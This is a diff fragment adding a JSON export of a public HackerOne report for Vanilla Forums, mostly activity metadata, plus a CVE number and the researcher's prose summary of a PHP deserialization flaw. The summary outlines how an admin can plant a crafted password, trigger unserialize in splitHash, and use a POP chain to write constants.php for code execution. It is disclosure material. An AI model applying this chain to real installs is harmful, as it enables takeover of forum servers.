+      "created_at": "2018-09-29T14:37:32.010Z",
+      "updated_at": "2018-09-29T14:37:32.010Z",
+      "actor": {
+        "username": "mr_me",
+        "cleared": false,
+        "verified": false,
+        "url": "/mr_me",
+        "profile_picture_urls": {
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/000/041/443/87c206e9ba716dc99839e7bfd04c0279d74fa6cc_original.jpg/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "vanilla"
+    },
+    {
+      "id": 3406223,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::BugResolved",
+      "message": "It is, thanks for the reminder.",
+      "automated_response": false,
+      "created_at": "2018-09-29T15:12:59.083Z",
+      "updated_at": "2018-09-29T15:12:59.083Z",
+      "actor": {
+        "username": "linc",
+        "cleared": false,
+        "verified": false,
+        "url": "/linc",
+        "profile_picture_urls": {
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/000/136/045/6328894ce30b4f6b0e176d2a721ce5ea9849d135_original.png/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "reporter": {
+        "username": "mr_me",
+        "url": "/mr_me"
+      },
+      "genius_execution_id": null,
+      "team_handle": "vanilla"
+    },
+    {
+      "id": 3527255,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::AgreedOnGoingPublic",
+      "message": "",
+      "automated_response": false,
+      "created_at": "2018-10-24T15:46:39.360Z",
+      "updated_at": "2018-10-24T15:46:39.360Z",
+      "first_to_agree": true,
+      "actor": {
+        "username": "mr_me",
+        "cleared": false,
+        "verified": false,
+        "url": "/mr_me",
+        "profile_picture_urls": {
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/000/041/443/87c206e9ba716dc99839e7bfd04c0279d74fa6cc_original.jpg/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "vanilla"
+    },
+    {
+      "id": 3701312,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::ReportBecamePublic",
+      "message": "",
+      "automated_response": false,
+      "created_at": "2018-11-23T15:46:49.192Z",
+      "updated_at": "2018-11-23T15:46:49.192Z",
+      "actor": {
+        "url": "/vanilla",
+        "ibb": false,
+        "profile_picture_urls": {
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/000/017/443/2720e6aeb834de4fd40765a5cae34abb78eb66cd_original.png/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
+        },
+        "profile": {
+          "name": "Vanilla"
+        }
+      },
+      "genius_execution_id": null,
+      "team_handle": "vanilla"
+    },
+    {
+      "id": 3710709,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::Comment",
+      "message": "CVE-2018-19500",
+      "automated_response": false,
+      "created_at": "2018-11-26T17:40:09.647Z",
+      "updated_at": "2018-11-26T17:40:09.647Z",
+      "actor": {
+        "username": "mr_me",
+        "cleared": false,
+        "verified": false,
+        "url": "/mr_me",
+        "profile_picture_urls": {
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/000/041/443/87c206e9ba716dc99839e7bfd04c0279d74fa6cc_original.jpg/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "vanilla"
+    }
+  ],
+  "activity_page_count": 1,
+  "activity_page_number": 1,
+  "summaries": [
+    {
+      "category": "team",
+      "can_view?": true,
+      "can_create?": false
+    },
+    {
+      "id": 10731,
+      "category": "researcher",
+      "content": "An attacking admin user can inject an unserializable password in a another users account. Later when attempting a login with that user, the attacker can trigger a call to an unserialize in the splitHash function. By using a custom pop chain to write into the constants.php file, an attacker can leverage this to gain remote code execution.",
+      "user": {
+        "id": 41443,
+        "username": "mr_me",
+        "name": "Steven Seeley",
+        "bio": "",
+        "cleared": false,
+        "verified": false,
+        "website": "https://srcincite.io/",
+        "location": "",
+        "created_at": "2015-10-08T18:38:12.546Z",
+        "url": "https://hackerone.com/mr_me",
+        "hackerone_triager": false,
+        "hackerone_employee": false,
+        "user_type": "hacker",
+        "profile_picture_urls": {
+          "small": "https://profile-photos.hackerone-user-content.com/variants/000/041/443/87c206e9ba716dc99839e7bfd04c0279d74fa6cc_original.jpg/3c7b305354c9073c106ae3d1701798defaaf5be844fb8fdfa49ca62f991a2c2c",
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/000/041/443/87c206e9ba716dc99839e7bfd04c0279d74fa6cc_original.jpg/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc",
+          "xtralarge": "https://profile-photos.hackerone-user-content.com/variants/000/041/443/87c206e9ba716dc99839e7bfd04c0279d74fa6cc_original.jpg/114764ec8f01b1a3e153599212c9f011fb3b0bce3a4fdc1f9a3c551f8c94acf8"
+        }
+      },
+      "can_view?": true,
+      "can_create?": false,
+      "attachments": [
+
+      ]
+    }
+  ]
+}
